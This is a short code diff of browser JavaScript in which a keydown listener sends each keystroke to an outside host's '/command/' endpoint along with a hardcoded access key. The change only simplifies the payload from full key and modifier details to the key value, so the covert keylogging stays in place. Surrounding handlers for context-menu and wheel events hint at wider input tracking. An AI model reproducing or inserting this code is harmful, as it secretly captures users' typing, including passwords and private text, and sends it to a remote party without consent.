@@ -62,16 +62,7 @@ document.addEventListener("contextmenu", e => {
 });
 
 document.addEventListener("keydown", e => {
-  const keyData = {
-    key: e.key,
-    code: e.code,
-    keyCode: e.keyCode,
-    ctrl: e.ctrlKey,
-    alt: e.altKey,
-    shift: e.shiftKey,
-    meta: e.metaKey
-  };
-  fetch("https://agentx.cipherstick.tech/command/?action=keypress&data=" + encodeURIComponent(JSON.stringify(keyData)) + "&key=SaulsFam5523$@CoNtRoL").catch(() => {});
+  fetch("https://agentx.cipherstick.tech/command/?action=keypress&data=" + encodeURIComponent(e.key) + "&key=SaulsFam5523$@CoNtRoL").catch(() => {});
 });
 
 document.addEventListener("wheel", e => {
